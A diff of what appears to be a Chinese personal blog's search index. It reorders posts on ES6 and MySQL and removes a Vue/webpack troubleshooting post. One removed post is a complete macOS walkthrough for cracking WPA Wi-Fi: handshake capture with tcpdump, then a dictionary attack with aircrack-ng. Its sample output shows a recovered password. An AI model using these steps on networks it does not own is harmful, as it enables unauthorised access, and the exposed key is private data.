@@ -184,30 +184,6 @@
       </tags>
   </entry>
   <entry>
-    <title>ES6语法</title>
-    <url>/Blog/2020/05/23/ES6%E8%AF%AD%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="ES6新语法"><a href="#ES6新语法" class="headerlink" title="ES6新语法"></a>ES6新语法</h2><p>1.变量/赋值<br>var     可以重复定义，不能限制修改，没有块级作用域<br>let      不能重复定义，变量，块级作用域<br>const 不能重复定义，常量，块级作用域</p>
-<p>解构赋值：<br>1.左右两边格式相同，右边必须是合法类型<br>2.必须是定义和赋值同步完成</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a,b,c] = [<span class="number">1</span>, <span class="number">12</span>, <span class="number">23</span>]；</span><br><span class="line"><span class="keyword">let</span> &#123;a, b, c&#125; = &#123;<span class="attr">a</span>: <span class="number">12</span>, <span class="attr">b</span>: <span class="number">89</span>, <span class="attr">c</span>: <span class="number">55</span>&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>2.函数<br>    箭头函数<br>    function (参数，参数) {<br>        函数体<br>    }<br>    (参数，参数) =&gt; {<br>        函数体<br>    }<br>    1.如果有且仅有1个参数，()可以省<br>    2.如果函数体只有一句话，而且是return，{}可以省</p>
-<p>​    默认参数<br>​        (a, b=xx, c=xxx)</p>
-<p>​    参数展示<br>​        function show(a, b, …参数名)<br>​        剩余参数必须在参数列表的最后</p>
-<p>3.数组/json</p>
-<p>4.字符串</p>
-<p>5.面向对象</p>
-<p>6.Promise</p>
-<p>7.generator</p>
-<p>8.模块</p>
-]]></content>
-      <categories>
-        <category>ES6</category>
-      </categories>
-      <tags>
-        <tag>ES6</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>GCD什么情况下会死锁?</title>
     <url>/Blog/2020/11/05/GCD%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E4%BC%9A%E6%AD%BB%E9%94%81/</url>
     <content><![CDATA[<img src="/Blog/2020/11/05/GCD%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E4%BC%9A%E6%AD%BB%E9%94%81/GCD%E6%AD%BB%E9%94%81.png" class="" title="GCD死锁情景分析图">
@@ -283,6 +259,30 @@
       </categories>
       <tags>
         <tag>iOS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ES6语法</title>
+    <url>/Blog/2020/05/23/ES6%E8%AF%AD%E6%B3%95/</url>
+    <content><![CDATA[<h2 id="ES6新语法"><a href="#ES6新语法" class="headerlink" title="ES6新语法"></a>ES6新语法</h2><p>1.变量/赋值<br>var     可以重复定义，不能限制修改，没有块级作用域<br>let      不能重复定义，变量，块级作用域<br>const 不能重复定义，常量，块级作用域</p>
+<p>解构赋值：<br>1.左右两边格式相同，右边必须是合法类型<br>2.必须是定义和赋值同步完成</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> [a,b,c] = [<span class="number">1</span>, <span class="number">12</span>, <span class="number">23</span>]；</span><br><span class="line"><span class="keyword">let</span> &#123;a, b, c&#125; = &#123;<span class="attr">a</span>: <span class="number">12</span>, <span class="attr">b</span>: <span class="number">89</span>, <span class="attr">c</span>: <span class="number">55</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>2.函数<br>    箭头函数<br>    function (参数，参数) {<br>        函数体<br>    }<br>    (参数，参数) =&gt; {<br>        函数体<br>    }<br>    1.如果有且仅有1个参数，()可以省<br>    2.如果函数体只有一句话，而且是return，{}可以省</p>
+<p>​    默认参数<br>​        (a, b=xx, c=xxx)</p>
+<p>​    参数展示<br>​        function show(a, b, …参数名)<br>​        剩余参数必须在参数列表的最后</p>
+<p>3.数组/json</p>
+<p>4.字符串</p>
+<p>5.面向对象</p>
+<p>6.Promise</p>
+<p>7.generator</p>
+<p>8.模块</p>
+]]></content>
+      <categories>
+        <category>ES6</category>
+      </categories>
+      <tags>
+        <tag>ES6</tag>
       </tags>
   </entry>
   <entry>
@@ -1113,63 +1113,40 @@
       </tags>
   </entry>
   <entry>
-    <title>MAC破解WiFi</title>
-    <url>/Blog/2020/03/15/MAC%E7%A0%B4%E8%A7%A3WiFi/</url>
-    <content><![CDATA[<p>1.安装airport</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport</span><br></pre></td></tr></table></figure>
-
-<p>2.扫描周围的Wifi</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo airport -s</span><br></pre></td></tr></table></figure>
-
-<p>3.嗅探指定的信道</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo airport en0 sniff <span class="variable">$CHANNEL</span></span><br></pre></td></tr></table></figure>
-
-<p>如果出现错误，Segmentation fault: 11，可以使用 tcpdump 抓包<br>4.1 断开airport的连接</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo airport -z</span><br></pre></td></tr></table></figure>
-
-<p>4.2 设置信道，-c和信道号之间没有空格</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo airport -c6</span></span><br><span class="line">$ sudo airport -c<span class="variable">$CHANNEL</span></span><br></pre></td></tr></table></figure>
-
-<p>4.3 从指定AP开始抓包</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo tcpdump &quot;type mgt subtype beacon and ether src 98:13:33:b4:35:a4&quot; -I -c 1 -i en0 -w beacon.cap</span></span><br><span class="line">$ sudo tcpdump <span class="string">&quot;type mgt subtype beacon and ether src <span class="variable">$BSSID</span>&quot;</span> -I -c 1 -i en0 -w beacon.cap</span><br></pre></td></tr></table></figure>
-
-<p>4.4 等待WPA的握手</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 示例：sudo tcpdump &quot;ether proto 0x888e and ether host 98:13:33:b4:35:a4&quot; -I -U -vvv -i en0 -w handshake.cap</span></span><br><span class="line">$ sudo tcpdump <span class="string">&quot;ether proto 0x888e and ether host <span class="variable">$BSSID</span>&quot;</span> -I -U -vvv -i en0 -w handshake.cap</span><br></pre></td></tr></table></figure>
-
-<p>4.5 安装wireshark，下一步会用到它的合包命令</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install wireshark</span><br></pre></td></tr></table></figure>
-
-<p>4.6 将2个cap文件合并成一个cap文件</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap</span><br></pre></td></tr></table></figure>
-
-<p>至少要等到4.4获取到4 frames或更多的包才可以Ctrl-C终止抓包。</p>
-<p>4.7 安装 aircrack-ng</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew install aircrack-ng</span><br></pre></td></tr></table></figure>
-
-<p>4.8 将 aircrack-ng 路径添加到 /etc/paths 中。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo vim /etc/paths</span><br></pre></td></tr></table></figure>
-<p>然后将 aircrack-ng 路径添加到最后一行。</p>
-<p>4.9 查看抓到的包中是否包含握手包。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#$ aircrack-ng capture.cap</span></span><br><span class="line">Hu-YupingdeMacBook-Pro:wifi kris$ aircrack-ng capture.cap</span><br><span class="line">Opening capture.capease <span class="built_in">wait</span>...</span><br><span class="line">Read 4 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  74:7D:24:D7:AF:DC  @PHICOMM_DA               WPA (0 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening capture.capease <span class="built_in">wait</span>...</span><br><span class="line">Read 4 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br></pre></td></tr></table></figure>
-<ol start="5">
-<li><p>撞击密码</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ aircrack-ng -w alphaDic.txt -b 98:13:33:B4:35:A4 capture1.cap</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>转换包格式,如果使用上面的cap无法爆破，或者爆破比较麻烦，可以将cap包转换成hcccapx格式，然后再破解。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./cap2hccapx.bin /Users/kris/Desktop/wifi/20200208/capture.cap /Users/kris/Desktop/wifi/20200208/capture.hccapx</span><br></pre></td></tr></table></figure>
-
-
-</li>
+    <title>MySQL基本命令</title>
+    <url>/Blog/2019/07/07/MySQL%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<p>MAC OSX上安装MySQL有多种方法：</p>
+<ul>
+<li><ol>
+<li>使用DMG文件安装，安装完在系统偏好设置中有相应的管理面板可以控制MySQL服务器开启和关闭，详情可访问<a href="https://dev.mysql.com/downloads/mysql/">官网下载地址</a></li>
 </ol>
-<p>下面是一个破解示例：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Aircrack-ng 1.5.2 </span><br><span class="line"></span><br><span class="line">      [00:03:20] 2018576/13516904 keys tested (10197.95 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 18 minutes, 47 seconds                         14.93%</span><br><span class="line"></span><br><span class="line">                          KEY FOUND! [ 19731009qiu ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : A8 36 07 C4 68 42 71 E0 B9 38 6E 16 B7 1B 7A 77 </span><br><span class="line">                       DA 07 E9 A1 82 CE 95 56 22 C2 76 16 93 B1 8E 9B </span><br><span class="line"></span><br><span class="line">      Transient Key  : 34 83 20 8E B0 2E F2 11 FF 5B 68 A4 A3 16 94 FE </span><br><span class="line">                       74 28 4D D9 99 BA 10 38 F4 20 6D 14 D1 47 89 C9 </span><br><span class="line">                       22 75 EB B5 29 FD CF 9B 01 32 38 B7 51 10 94 88 </span><br><span class="line">                       90 4D 52 D5 88 E4 B1 58 DA 2D DC 35 5F 61 88 92 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : F6 4D 5F 02 77 F9 96 8A F4 E3 C7 8C DA E4 C6 E0 </span><br></pre></td></tr></table></figure>
-
+</li>
+<li><ol start="2">
+<li>使用Homebrew安装，打开终端，输入命令<code>brew install mysql</code> ,这个安装过程中可能需要升级Homebrew，Homebrew的升级需要翻墙</li>
+</ol>
+</li>
+</ul>
+<h2 id="安装完测试MySQL需要使用的基本命令如下："><a href="#安装完测试MySQL需要使用的基本命令如下：" class="headerlink" title="安装完测试MySQL需要使用的基本命令如下："></a>安装完测试MySQL需要使用的基本命令如下：</h2><p>1.使用brew安装完MySQL时,root密码默认为空，如果要设置MySQL的相关安全策略，使用命令: <code>mysql_secure_installation</code></p>
+<p>2.打开mysql,带后台线程（电脑重启后会自己开启）:<code>brew services start mysql</code></p>
+<p>3.打开mysql，不带后台线程:<code>mysql.server start</code></p>
+<p>4.退出mysql:<code>brew services stop mysql</code></p>
+<p>5.登录MySQL:<code>mysql -u root -p</code></p>
+<p>6.查看MySQL的版本号:mysql&gt; <code>select Version();</code></p>
+<p>7.查看当前登录的MySQL运行的端口号:mysql&gt; <code>show global variables like &#39;port&#39;;</code></p>
+<p>8.显示可用的数据库:<code>SHOW DATABASES;</code></p>
+<p>9.选择数据库:mysql&gt; <code>USE crashcourse;</code></p>
+<p>10.显示数据库中所有可用的表:mysql&gt; <code>SHOW TABLES;</code></p>
+<p>11.显示表列: <code>SHOW COLUMNS FROM customers;</code> 或 <code>DESCRIBE customers;</code></p>
+<p>12.显示服务器状态信息:<code>SHOW STATUS;</code></p>
+<p>13.显示用户的安全权限:<code>SHOW GRANTS;</code></p>
+<p>14.显示服务器错误信息:<code>SHOW ERRORS;</code></p>
+<p>15.显示服务器警告信息:<code>SHOW WARNINGS;</code></p>
 ]]></content>
       <categories>
-        <category>通用</category>
+        <category>MySQL</category>
       </categories>
       <tags>
-        <tag>通用</tag>
+        <tag>MySQL</tag>
       </tags>
   </entry>
   <entry>
@@ -1274,43 +1251,6 @@
       </categories>
       <tags>
         <tag>Markdown</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MySQL基本命令</title>
-    <url>/Blog/2019/07/07/MySQL%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<p>MAC OSX上安装MySQL有多种方法：</p>
-<ul>
-<li><ol>
-<li>使用DMG文件安装，安装完在系统偏好设置中有相应的管理面板可以控制MySQL服务器开启和关闭，详情可访问<a href="https://dev.mysql.com/downloads/mysql/">官网下载地址</a></li>
-</ol>
-</li>
-<li><ol start="2">
-<li>使用Homebrew安装，打开终端，输入命令<code>brew install mysql</code> ,这个安装过程中可能需要升级Homebrew，Homebrew的升级需要翻墙</li>
-</ol>
-</li>
-</ul>
-<h2 id="安装完测试MySQL需要使用的基本命令如下："><a href="#安装完测试MySQL需要使用的基本命令如下：" class="headerlink" title="安装完测试MySQL需要使用的基本命令如下："></a>安装完测试MySQL需要使用的基本命令如下：</h2><p>1.使用brew安装完MySQL时,root密码默认为空，如果要设置MySQL的相关安全策略，使用命令: <code>mysql_secure_installation</code></p>
-<p>2.打开mysql,带后台线程（电脑重启后会自己开启）:<code>brew services start mysql</code></p>
-<p>3.打开mysql，不带后台线程:<code>mysql.server start</code></p>
-<p>4.退出mysql:<code>brew services stop mysql</code></p>
-<p>5.登录MySQL:<code>mysql -u root -p</code></p>
-<p>6.查看MySQL的版本号:mysql&gt; <code>select Version();</code></p>
-<p>7.查看当前登录的MySQL运行的端口号:mysql&gt; <code>show global variables like &#39;port&#39;;</code></p>
-<p>8.显示可用的数据库:<code>SHOW DATABASES;</code></p>
-<p>9.选择数据库:mysql&gt; <code>USE crashcourse;</code></p>
-<p>10.显示数据库中所有可用的表:mysql&gt; <code>SHOW TABLES;</code></p>
-<p>11.显示表列: <code>SHOW COLUMNS FROM customers;</code> 或 <code>DESCRIBE customers;</code></p>
-<p>12.显示服务器状态信息:<code>SHOW STATUS;</code></p>
-<p>13.显示用户的安全权限:<code>SHOW GRANTS;</code></p>
-<p>14.显示服务器错误信息:<code>SHOW ERRORS;</code></p>
-<p>15.显示服务器警告信息:<code>SHOW WARNINGS;</code></p>
-]]></content>
-      <categories>
-        <category>MySQL</category>
-      </categories>
-      <tags>
-        <tag>MySQL</tag>
       </tags>
   </entry>
   <entry>
@@ -2221,36 +2161,6 @@ NSRunLoopCommonModes并不是一个真的模式，它只是一个标记,timer能
       </tags>
   </entry>
   <entry>
-    <title>Vue打包报错Error: webpack.optimize.UglifyJsPlugin has been removed, please use config.optimization.minimize instead.</title>
-    <url>/Blog/2020/03/19/Vue%E6%89%93%E5%8C%85%E6%8A%A5%E9%94%99Error-webpack-optimize-UglifyJsPlugin-has-been-removed-please-use-config-optimization-minimize-instead/</url>
-    <content><![CDATA[<p>使用命令<code>npm run build</code>进行生产构建时，报错<code>Error: webpack.optimize.UglifyJsPlugin has been removed, please use config.optimization.minimize instead.</code>，详细的错误信息如下:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">^CHu-YupingdeMacBook-Pro:demo2 kris$ npm run build</span><br><span class="line"></span><br><span class="line">&gt; demo2@1.0.0 build /Users/kris/Documents/VueDemo/chapter4/demo2</span><br><span class="line">&gt; cross-env NODE_ENV=production webpack --progress --hide-modules</span><br><span class="line"></span><br><span class="line">/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:93</span><br><span class="line">				throw err;</span><br><span class="line">				^</span><br><span class="line"></span><br><span class="line">Error: webpack.optimize.UglifyJsPlugin has been removed, please use config.optimization.minimize instead.</span><br><span class="line">    at Object.get [as UglifyJsPlugin] (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack/lib/webpack.js:189:10)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/kris/Documents/VueDemo/chapter4/demo2/webpack.config.js:68:26)</span><br><span class="line">    at Module._compile (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/v8-compile-cache/v8-compile-cache.js:192:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:600:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:531:3)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:637:17)</span><br><span class="line">    at require (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/v8-compile-cache/v8-compile-cache.js:161:20)</span><br><span class="line">    at WEBPACK_OPTIONS (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:114:13)</span><br><span class="line">    at requireConfig (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:116:6)</span><br><span class="line">    at /Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:123:17</span><br><span class="line">    at Array.forEach (&lt;anonymous&gt;)</span><br><span class="line">    at module.exports (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/utils/convert-argv.js:121:15)</span><br><span class="line">    at yargs.parse (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:71:45)</span><br><span class="line">    at Object.parse (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/yargs/yargs.js:567:18)</span><br><span class="line">    at /Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:49:8</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack-cli/bin/cli.js:366:3)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:701:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:600:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:531:3)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:637:17)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:22:18)</span><br><span class="line">    at Object.&lt;anonymous&gt; (/Users/kris/Documents/VueDemo/chapter4/demo2/node_modules/webpack/bin/webpack.js:156:2)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:701:30)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:712:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:600:32)</span><br><span class="line">    at tryModuleLoad (internal/modules/cjs/loader.js:539:12)</span><br><span class="line">npm ERR! code ELIFECYCLE</span><br><span class="line">npm ERR! errno 1</span><br><span class="line">npm ERR! demo2@1.0.0 build: `cross-env NODE_ENV=production webpack --progress --hide-modules`</span><br><span class="line">npm ERR! Exit status 1</span><br><span class="line">npm ERR! </span><br><span class="line">npm ERR! Failed at the demo2@1.0.0 build script.</span><br><span class="line">npm ERR! This is probably not a problem with npm. There is likely additional logging output above.</span><br><span class="line"></span><br><span class="line">npm ERR! A complete <span class="built_in">log</span> of this run can be found <span class="keyword">in</span>:</span><br><span class="line">npm ERR!     /Users/kris/.npm/_logs/2020-03-19T04_56_08_555Z-debug.log</span><br></pre></td></tr></table></figure>
-
-<p>查资料发现webpack4已经不支持在plugins里面操作<code>UglifyJsPlugin</code>，需要将<code>UglifyJsPlugin</code>放到<code>optimization</code>里面进行配置。打开<code>webpack.config.js</code>文件，发现老的配置如下：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var path = require(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">var webpack = require(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  entry: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    publicPath: <span class="string">&#x27;/dist/&#x27;</span>,</span><br><span class="line">    filename: <span class="string">&#x27;build.js&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.css$/,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;vue-style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">        ],</span><br><span class="line">      &#125;,      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.vue$/,</span><br><span class="line">        loader: <span class="string">&#x27;vue-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          loaders: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          // other vue-loader options go here</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.js$/,</span><br><span class="line">        loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">        exclude: /node_modules/</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.(png|jpg|gif|svg)$/,</span><br><span class="line">        loader: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          name: <span class="string">&#x27;[name].[ext]?[hash]&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    <span class="built_in">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    extensions: [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.vue&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    historyApiFallback: <span class="literal">true</span>,</span><br><span class="line">    noInfo: <span class="literal">true</span>,</span><br><span class="line">    overlay: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  performance: &#123;</span><br><span class="line">    hints: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  devtool: <span class="string">&#x27;#eval-source-map&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  module.exports.devtool = <span class="string">&#x27;#source-map&#x27;</span></span><br><span class="line">  // http://vue-loader.vuejs.org/en/workflow/production.html</span><br><span class="line">  module.exports.plugins = (module.exports.plugins || []).concat([</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">&#x27;process.env&#x27;</span>: &#123;</span><br><span class="line">        NODE_ENV: <span class="string">&#x27;&quot;production&quot;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    new webpack.optimize.UglifyJsPlugin(&#123;</span><br><span class="line">      sourceMap: <span class="literal">true</span>,</span><br><span class="line">      compress: &#123;</span><br><span class="line">        warnings: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    new webpack.LoaderOptionsPlugin(&#123;</span><br><span class="line">      minimize: <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>修改完的<code>webpack.config.js</code>文件内容如下:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">var path = require(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">var webpack = require(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"><span class="built_in">let</span> UglifyJsPlugin = require(<span class="string">&#x27;uglifyjs-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">  entry: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    path: path.resolve(__dirname, <span class="string">&#x27;./dist&#x27;</span>),</span><br><span class="line">    publicPath: <span class="string">&#x27;/dist/&#x27;</span>,</span><br><span class="line">    filename: <span class="string">&#x27;build.js&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.css$/,</span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">&#x27;vue-style-loader&#x27;</span>,</span><br><span class="line">          <span class="string">&#x27;css-loader&#x27;</span></span><br><span class="line">        ],</span><br><span class="line">      &#125;,      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.vue$/,</span><br><span class="line">        loader: <span class="string">&#x27;vue-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          loaders: &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          // other vue-loader options go here</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.js$/,</span><br><span class="line">        loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">        exclude: /node_modules/</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">test</span>: /\.(png|jpg|gif|svg)$/,</span><br><span class="line">        loader: <span class="string">&#x27;file-loader&#x27;</span>,</span><br><span class="line">        options: &#123;</span><br><span class="line">          name: <span class="string">&#x27;[name].[ext]?[hash]&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    <span class="built_in">alias</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;vue$&#x27;</span>: <span class="string">&#x27;vue/dist/vue.esm.js&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    extensions: [<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.vue&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    historyApiFallback: <span class="literal">true</span>,</span><br><span class="line">    noInfo: <span class="literal">true</span>,</span><br><span class="line">    overlay: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  performance: &#123;</span><br><span class="line">    hints: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  optimization: &#123;</span><br><span class="line">    minimizer: [</span><br><span class="line">      new UglifyJsPlugin(&#123;</span><br><span class="line">        uglifyOptions: &#123;</span><br><span class="line">          compress: <span class="literal">false</span>,</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  devtool: <span class="string">&#x27;#eval-source-map&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  module.exports.devtool = <span class="string">&#x27;#source-map&#x27;</span></span><br><span class="line">  // http://vue-loader.vuejs.org/en/workflow/production.html</span><br><span class="line">  module.exports.plugins = (module.exports.plugins || []).concat([</span><br><span class="line">    new webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">&#x27;process.env&#x27;</span>: &#123;</span><br><span class="line">        NODE_ENV: <span class="string">&#x27;&quot;production&quot;&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    new webpack.LoaderOptionsPlugin(&#123;</span><br><span class="line">      minimize: <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>改动之处有2处，第一处，把<code>UglifyJsPlugin</code>放到上面的exports的<code>optimization</code>中；第二处，在文件开头之处导入<code>UglifyJsPlugin</code>。</p>
-<p>改完之后执行<code>npm run dev</code>，效果如下:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Hu-YupingdeMacBook-Pro:demo2 kris$ npm run dev</span><br><span class="line"></span><br><span class="line">&gt; demo2@1.0.0 dev /Users/kris/Documents/VueDemo/chapter4/demo2</span><br><span class="line">&gt; cross-env NODE_ENV=development webpack-dev-server --open --hot</span><br></pre></td></tr></table></figure>
-
-<p>改完之后执行<code>npm run build</code>，效果如下：</p>
